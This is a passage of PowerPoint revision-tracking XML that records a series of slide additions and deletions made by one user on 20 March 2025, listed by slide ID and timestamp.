        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2133613946" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2787169713" sldId="316"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3143152445" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1891612144" sldId="319"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634256623" sldId="320"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="457846813" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="588562779" sldId="322"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1687481207" sldId="323"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3716732749" sldId="324"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2646409532" sldId="344"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3328506669" sldId="346"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="595429778" sldId="347"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="748044440" sldId="348"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4233839096" sldId="350"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2232291841" sldId="351"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4087151815" sldId="352"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3985075604" sldId="353"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3986174731" sldId="354"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="959203693" sldId="355"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1054372392" sldId="357"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3148908113" sldId="358"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2647045171" sldId="359"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2157736222" sldId="360"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="804485718" sldId="363"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1699207309" sldId="364"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3735486349" sldId="365"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="126032379" sldId="366"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:40.890" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1562164104" sldId="367"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2293073542" sldId="368"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="472892435" sldId="369"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2108371064" sldId="370"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3532523845" sldId="371"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3025944200" sldId="372"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="680786746" sldId="373"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="80628007" sldId="374"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="463362644" sldId="375"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3650105825" sldId="376"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2628521278" sldId="377"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="714565181" sldId="378"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3537713616" sldId="379"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="32852236" sldId="380"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2427872828" sldId="381"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2578737727" sldId="382"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2989617769" sldId="383"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="471122951" sldId="384"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3987938855" sldId="385"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="105133072" sldId="386"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="23358819" sldId="387"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="47094207" sldId="388"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2122555257" sldId="389"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="427466444" sldId="390"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2560783180" sldId="392"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2725147503" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3867351119" sldId="394"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="91382918" sldId="395"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="86065769" sldId="396"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1647286038" sldId="397"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4165849769" sldId="398"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3316306428" sldId="399"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3289750946" sldId="400"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3406329423" sldId="401"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="779717233" sldId="402"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="907440495" sldId="403"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4158265485" sldId="404"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2166687213" sldId="405"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="826451299" sldId="406"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4002299708" sldId="408"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1601157176" sldId="409"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3160002234" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2820580642" sldId="423"/>
        </pc:sldMkLst>
